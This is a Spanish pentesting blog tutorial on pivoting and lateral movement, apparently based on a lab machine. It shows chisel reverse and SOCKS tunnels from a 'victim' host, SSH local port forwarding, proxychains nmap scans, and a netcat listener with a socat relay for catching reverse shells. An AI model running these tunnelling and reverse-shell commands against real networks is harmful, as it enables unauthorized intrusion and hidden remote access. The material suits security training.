---
layout: single
title: Pivoting.
excerpt: "Es una técnica utilizada después de haber comprometido un sistema y así acceder a otros sistemas interconectados."
date: 2023-01-11
classes: wide
header:
  teaser: /assets/images/pivoting.png
  teaser_home_page: true
categories:
- Pivoting
- Ethical Hacking
- Pentesting
tags:
- Pivoting
- Pentesting
---

# Pivoting.
Técnica utilizada para moverse a través de una red de un punto a otro, explorando diferentes partes de la red a medida que se avanza. Generalmente el pivoting es usado para expandir los permisos y acceso ganado en un sistema vulnerable, tambien puedes obtener acceso a sistemas remotos conectados con el sistema comprometido, o para obtener acceso a otras redes conectadas a la red inicial.<br>
Básicamente es utilizar un punto comprometido en una red para obtener acceso a otras partes de la red.<br><br>
El movimiento lateral es la capacidad de un atacante para moverse a tráves de una red y obtener acceso a diferentes sistemas haciendo uso de credenciales obtenidas, propagación de malware, técnicas de ingenieria social, herramientas de gestión remota, scripts, uso de servicios de red (SMB, HTTP, SSH etc) o la explotación de vulnerabilidades. El objetivo del movimiento lateral es expandir el acceso inicial obtenido a otros sistemas y recursos conectados a él.
<br><br>
Estos son algunos de los comandos que te ayudarán a aplicar reconocimiento en la red y encontrar otros equipo dentro del sistema.<br>
## ip a.
El comando ip a muestra información sobre las interfaces de red configuradas en el sistema, incluyendo su dirección IP, máscara de subred, nombre, dirección MAC y el estado.
<br><br>
## hostname -I.
Comando que muestra las direcciones IPv4 correspondientes a las interfaces de red disponibles en el sistema configuradas, en lugar de mostrarte el nombre de host configurado.<br><br>
## RPF (Remote Port Forwarding).
Es una técnica utilizada para redirigir el tráfico de un puerto especico en un equipo remote a un puerto específico en un equipo local. Básicamente es hacer que un puerto en un equipo se convierta en el puerto de tu equipo.<br>
Para utilizar esta técnica puedes hacer uso de chisel que es una herramienta para crear túneles, la redirección de puertos, capturas de pantalla y grabación de sesiones de un escritorio remoto.<br>
```
./chisel server --reverse -p 1234	# Desde tu máquina.
# chisel server -> Indica que se creará un servidor en el sistema local para establecer una conexión remota.
# --reverse -> Indica que se utilizará la opción reverse port forwarding para que un cliente pueda conectarse a un puerto.
# -p 1234 -> Con este parámetro se establece un puerto en específico, en este caso se utiliza el puerto 1234.
```
```
./chisel client <ip-address>:1234 R:80:<target-IP>:80	# Desde la máquina víctima.
# chisel client -> Indica que se establecera una conexión remota.
# <ip-address>:1234 -> Dirección IP y puerto de tu máquina por donde se establacerá la conexión.
R:<80>:<target-IP>:<80> -> "R" indica que se realizará una redirección de tráfico, del puerto 80 de la dirección IP en la máquina víctima al puerto 80 de tu máquina. 
# Todo el tráfico entrante al puerto 80 del sistema remote <target-IP> será redirigido al puerto 80 de tu equipo.
```
Para acceder al puerto puedes hacerlo desde el navegador usando el localhost .
```
http://localhost

http://127.0.0.1:80
```
<br><br>
## LFI (Local Port Forwarding).
El Local Port Forwarding es una técnica utilizada para redirigir el tráfico de una conexión entrante desde un puerto en la máquina local (cliente) a otro puerto en una máquina remota a través de una conexión segura. Esta técnica es utilizada para permitir que los clientes se conecten a servicios que se encuentran en una red remota a través de un túnel SSH o una conexión VPN, sin necesidad de exponer los servicios a Internet o a una red no confiable.
<br>
Por ejemplo, si un usuario desea conectarse a un servidor web que se encuentra en una red remota, pero no desea exponer el servidor web directamente a Internet, puede establecer una conexión SSH a un servidor intermedio que actúe como proxy. Luego, utilizando el Local Port Forwarding, puede redirigir el tráfico que llega al puerto en la máquina local a través del túnel SSH hacia el puerto en la máquina remota donde se encuentra el servidor web.
<br>
Lo primero se tendría que hacer es ver si la máquian tiene puertos abiertos internamente con el comando `` netstat -nat `` o con `` ss -nltp ``.
```
aeolus@symfonos2:/$ ss -nltp
State      Recv-Q Send-Q     Local Address:Port                    Peer Address:Port    
LISTEN     0      80             127.0.0.1:3306                               *:*            
LISTEN     0      50                     *:139                                *:*           
LISTEN     0      128            127.0.0.1:8080                               *:*             
LISTEN     0      32                     *:21                                 *:*             
LISTEN     0      128                    *:22                                 *:*             
LISTEN     0      20             127.0.0.1:25                                 *:*            
LISTEN     0      50                     *:445                                *:*            
LISTEN     0      50                    :::139                               :::*             
LISTEN     0      64                    :::80                                :::*             
LISTEN     0      128                   :::22                                :::*             
LISTEN     0      20                   ::1:25                                :::*             
LISTEN     0      50                    :::445                               :::*
```
Los puertos que tienen la siguiente estructura "127.0.0.1:3306" son los puertos que estan abiertos internamente.
<br>
Posteriormente ejecutas el comando `` lsof -i:<puerto> `` para ver si el puerto que quieres traerte a tu equipo no este siendo ocupado por otro proceso. El comando lsof (list open files) listará los procesos que esta siendo ejecutados en el puerto que le indiques, el parámetro -i es para indicar que solo te muestre las conexiones de red.
```
lsof -i:443 

COMMAND      PID     USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
firefox-e   1830 sickcore   34u  IPv4 1899012      0t0  TCP 192.168.0.13:60190->111.18.12.33:https (ESTABLISHED)
firefox-e   1830 sickcore   55u  IPv4 1899013      0t0  TCP 192.168.0.13:60204->111.18.12.33:https (ESTABLISHED)
nc        470864     root    4u  IPv4 1345447      0t0  TCP 192.168.0.13:https->symfonos.local:48168 (ESTABLISHED)
```
Aplicación de un Local Port Forwarding para que el puerto 8080 de la máquina víctima se convierta en el puerto 8080 de tu equipo.
```
ssh <username>@<ip-address> -L 8080:127.0.0.1:8080
```
Nuevamente para comprobar que el tráfico del puerto 8080 de la máquina remota se haya redirigido a tu puerto 8080 lo puedes comprobar con el comando `` lsof -i:8080 ``.
```
lsof -i:8080

COMMAND    PID     USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
ssh     768354 sickcore    4u  IPv4 1914864      0t0  TCP *:http-alt (LISTEN)
```
Como en el puerto 8080 esta corriendo un servicio HTTP podemos ver el contenido ingresando a la dirección "http://127.0.0.1:8080" desde tu navegador. 
<br><br>
Establecer una conexión de tipo SOCKS para redirigir el tráfico de red a través de un servidor proxy. Esto permite acceder a recursos de red restringidos o bloqueados mediante la conexión remota. Esta conexión es muy util para no estar trayendote puerto por puerto como en el comando anterior.<br>
Una conexión de tipo SOCKS (Socket Secure) es una conexión de red que utiliza el protocolo SOCKS para enrutar el tráfico de red a través de un servidor proxy.<br>
```
chisel client <ip-address>:1234 R:socks
```
Debes modíficar el archivo /etc/proxychains.conf para poder tener acceso a la conexión establecida agregando la siguiente linea al final del archivo.<br>
`` socks5 127.0.0.1 1080 ``.
<br><br>
## Proxychains.
Es una herramienta que intercepta el tráfico de red y lo enruta a un servidor proxy especificado en su configuración.<br>

Realizar un escaneo de puertos usando proxychains.
```
proxychains nmap -p- --open -sT -T5 -v -n -Pn <ip-address> -oG allPorts 2>&1 | grep -vE "timeout|OK"

# proxychains nmap -> Indica que se utilizará nmap para realizar el escaneo de puertos aprovechandose de la conexión socks5 establecida.
# -p- -> Escaneo a 65535 puertos.
# --open -> Nmap reportará solo aquellos puertos con status abierto.
# -sT -> Escaneo mediante el protocolo TCP.
# -T5 -> Indica el tiempo de espera que esperará para recibir una respuesta por parte de los dispositivos escaneados y asi evitar la perdida de paquetes.  
# -v -> Verbose para que a medida que se vaya realizando el escaneo se vayan reportando los puertos abiertos encontrados.
# -n -> Indique que no se aplique resolición DNS.
# -Pn -> Indica que no se aplique discubrimiento de host.
# -oG -> Exportar el resultado en formato grepable al archivo allPorts.
# 2>&1 -> Indica que se rediridirá la salida de error (stder) al descriptor de archivo 2 a la salida estandar (stout) descriptor 1.
# Los errores generados por el comando por el comando anterior se mostrarán en consola junto con la salida normal en lugar de ser ignorados.
# Esto fácilita que puedas filtrar por los puertos quitando cadenas de caracteres.
# grep -vE -> Sirve para quitar multiples cadenas de caracteres separadas por un "|" que no quieres que se muestren en consola.
```
Para tener acceso al sitio web de la máquina debes configurar un proxy (foxy-proxy) de tipo SOCKS 5 desde el localhost (127.0.0.1) en el puerto 1080 (Donde se estableció el túnel con chisel).<br>
Cada que quieras interactuar con el equipo que tiene establecida la conexión de tipo SOCKS, tienes que llamar primero a la herramienta proxychains antes de la instrucción que quieras ejecutar para que todas las consultas pasen por túnel creado.<br>
Ej;<br>
`` proxychains smbmap -H <ip-address> ``
`` proxychains whatweb http://<ip-address> ``
<br><br>
## Reverse Shell(socat).
Para enviarte una reverse shell desde un segundo equipo a tu máquina de atacante es necesario hacer uso de socat.<br>
Socat es una herramienta de línea de comandos que se utiliza para crear conexiones bidireccionales entre dos puntos finales de una red.<br>
Esta herramienta te permite crear una variedad de conexiones de red, como conexiones TCP, UDP, IPv4, IPv6, SSL/TLS, SSH y SOCKS. También se puede utilizar para crear conexiones en modo cliente-servidor, conectar varios puntos finales y redirigir puertos y archivos.
<br>
Lo primero que tienes que hacer es ponerte en escucha desde tu equipo con netcat para poder recibir la reverse shell.
```
nc -nlvp 4646
```
<br>
Posteriormente tendrías que ejecutar el siguiente comando desde una máquina ya comprometida `` socat TCP-LISTEN:<port>,fork TCP:<ip-address>:<port> `` para que todo el tráfico que pase por ese equipo en el puerto indicado sea redirigido a tu máquina de atacante.
<br>
- Para que esto tenga efecto debes de mantener una conexión de tipo SOCKS entre tu máquina de atacante y el primer equipo comprometido.<br>
Desde tu equipo ejecutas el siguiente comando `` chisel server --reverse -p <port> ``. <br>
Desde la máquina víctima ejecutas `` ./chisel client <tu-ip-address>:<port> R:socks``. <br>


El siguiente comando que crea un servidor de reenvío TCP que escucha en el puerto 4646 del sistema local y redirige todas las conexiones entrantes a un servidor remoto en la dirección IP especificada en el puerto 4646.
```
socat TCP-LISTEN:4646,fork TCP:192.168.0.13:4646
```
Ahora para enviarte una reverse shell desde un segundo equipo tienes que enviarla al primier equipo comprometido para que este a su vez rediriga la conexión por socat y te la envié a tu equipo.














